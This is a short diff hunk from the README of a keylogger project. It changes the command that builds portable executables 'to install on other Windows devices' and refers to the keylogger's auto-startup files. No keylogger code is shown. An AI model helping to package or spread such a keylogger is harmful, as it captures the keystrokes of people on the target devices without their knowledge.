@@ -61,7 +61,7 @@ To remove auto startup remove keylogger related files at:
 ## Create portable executables to install on other Windows devices
 
 ```powershell
-bat startup.bat
+start startup.bat
 ```
 
 This will generate 2 files at `dist/` folder:
